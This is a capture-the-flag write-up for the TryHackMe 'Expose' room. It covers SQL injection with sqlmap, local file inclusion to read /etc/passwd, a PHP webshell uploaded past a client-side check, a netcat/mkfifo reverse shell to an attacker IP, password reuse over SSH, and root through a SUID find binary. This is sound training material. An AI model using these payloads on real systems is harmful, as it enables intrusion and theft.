# Expose: Write-up (TryHackMe)

**Platform:** TryHackMe  
**Room:** Expose  
**Difficulty:** Easy  

---

## 1. Executive Summary

This assessment targets a Linux host exposing multiple services. The compromise chain involves identifying a vulnerability in a custom web application through **SQL Injection**, which leaked specific database credentials and hidden application paths. These paths led to **Local File Inclusion (LFI)** for user enumeration, acting as a gateway to an **Arbitrary File Upload** vulnerability. Privilege escalation to root was achieved by abusing a misconfigured SUID binary.

---

## 2. Reconnaissance & Enumeration

### Network Scanning
A comprehensive scan with version detection was conducted.

```bash
└─$ sudo nmap -sV -sC -p- --min-rate 5000 <TARGET_IP>
```

**Key Findings:**
```text
PORT     STATE SERVICE
21/tcp   open  ftp (vsftpd 2.0.8 or later)
22/tcp   open  ssh (OpenSSH 7.6p1)
53/tcp   open  domain (ISC BIND 9.11.3)
1337/tcp open  http (Apache httpd 2.4.29)
1883/tcp open  mqtt (Mosquitto 1.4.15)
```

**Service Analysis:**
- **Port 21 (FTP):** Anonymous login allowed (Empty directory).
- **Port 1337 (HTTP):** Custom web application titled "EXPOSED".
- **Port 53 (DNS):** Queried `version.bind`; no internal zones revealed through AXFR attempts.
  *Commands:* `dig @<TARGET_IP> version.bind chaos txt`
  `dig @<TARGET_IP> axfr <domain>  # Result: Refused/Failed`
- **Port 1883 (MQTT):** Subscribed to all topics with a 5-second timeout; no messages retained.
  *Command:* `mosquitto_sub -h <TARGET_IP> -t '#' -W 5`

### Web Enumeration (Port 1337)
Directory brute-forcing identified several endpoints.

```bash
└─$ gobuster dir -u http://<TARGET_IP>:1337 -w /usr/share/wordlists/dirb/big.txt -x php,html,txt
```

**Discovered Paths:**
- `/admin/` (Status: 200)
- `/admin_101/` (Status: 200)

**Decoy Verification:**
The `/admin/` endpoint was investigated. Analysis via Browser DevTools confirmed that clicking "Login" generated **no network traffic** (POST request), confirming it as a decoy. Focus shifted to `/admin_101/`.

---

## 3. Exploitation (Web Layer)

### Vulnerability 1: SQL Injection (`/admin_101/`)
The login page at `/admin_101/` posts to `includes/user_login.php`. Manual testing verified the vulnerability.

**Validation:**
Injecting a single quote (`'`) into the email field returned a database error:
> *Error: You have an error in your SQL syntax...*

**Exploitation:**
I used `sqlmap` to automate the extraction. No session cookies were required as the endpoint is unauthenticated.

```bash
└─$ sqlmap -u "http://<TARGET_IP>:1337/admin_101/includes/user_login.php" \
    --data "email=test&password=test" -p email --batch --dump
```

**Critical Data Recovered:**
1.  **Table `config`:** Revealed hidden URL paths (`/file1010111/index.php` and `/upload-cv00101011/index.php`).
2.  **Table `user`:** Contained the hash for `hacker@root.thm`.
    * *Action:* The hash was cracked offline, revealing the password `[REDACTED]`.

### Vulnerability 2: Local File Inclusion (`/file1010111/`)
Using the cracked credentials, I accessed the LFI portal. Code review of the page source hinted at a `file` parameter.

**Payload Validation:**
I tested for direct file access without path traversal sequences (`../`), verifying that absolute paths were accepted.

```bash
└─$ curl "http://<TARGET_IP>:1337/file1010111/index.php?file=/etc/passwd"
```

**Result:** The server returned `/etc/passwd`.
**User Discovery:** The output revealed a specific user named `zeamkish`.

### Vulnerability 3: Arbitrary File Upload (`/upload-cv00101011/`)
This portal required the username `zeamkish` (discovered via LFI).

**Bypass Method:**
The application used a **client-side JavaScript check** to validate file extensions.
1.  I created a PHP webshell: `<?php system($_GET['cmd']); ?>`.
2.  I intercepted the upload request using Burp Suite.
3.  I forwarded the PHP file (Content-Type: `application/x-php`) despite the client-side warning. The server accepted the file, confirming missing server-side validation.

**Execution (Webshell):**
HTML Source analysis of the handler script revealed the upload destination: `var url = 'upload_thm_1001/...'`.

```bash
└─$ curl "http://<TARGET_IP>:1337/upload_thm_1001/shell.php?cmd=id"
# Output: uid=33(www-data) ...
```

---

## 4. Initial Access & Lateral Movement

### Reverse Shell
I set up a listener on my attack machine.

```bash
└─$ nc -lvnp 443
```

Using the uploaded webshell, I triggered the connection.

```bash
# Payload (URL Encoded)
?cmd=rm+/tmp/f;mkfifo+/tmp/f;cat+/tmp/f|/bin/sh+-i+2>%261|nc+<ATTACKER_IP>+443+>/tmp/f
```

**Callback Evidence:**
```text
connect to [<ATTACKER_IP>] from (UNKNOWN) [<TARGET_IP>] 45982
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Lateral Movement (SSH)
After stabilizing the shell as `www-data`, I attempted to reuse the credentials recovered earlier from the database dump (Password Reuse).

```bash
└─$ ssh zeamkish@<TARGET_IP>
# Password: [REDACTED] (Same as DB user)
```

**User Flag:**
```bash
zeamkish@expose:~$ cat /home/zeamkish/flag.txt
THM{[REDACTED]}
```

---

## 5. Privilege Escalation (Root)

### Enumeration
I checked for binaries with the SUID bit set.

```bash
zeamkish@expose:~$ find / -perm -4000 2>/dev/null
```

**Critical Finding:** `/usr/bin/find`

**Evidence of SUID:**
```bash
zeamkish@expose:~$ ls -la /usr/bin/find
-rwsr-xr-x 1 root root ... /usr/bin/find
```
*Note the 's' bit indicating execution with owner (root) privileges.*

### Exploitation
Using `find`'s `-exec` parameter, I spawned a shell.

```bash
zeamkish@expose:~$ /usr/bin/find . -exec /bin/sh -p \; -quit
# id
uid=1001(zeamkish) gid=1001(zeamkish) euid=0(root) ...
```

**Root Flag:**
```bash
# cat /root/root.txt
THM{[REDACTED]}
```
---

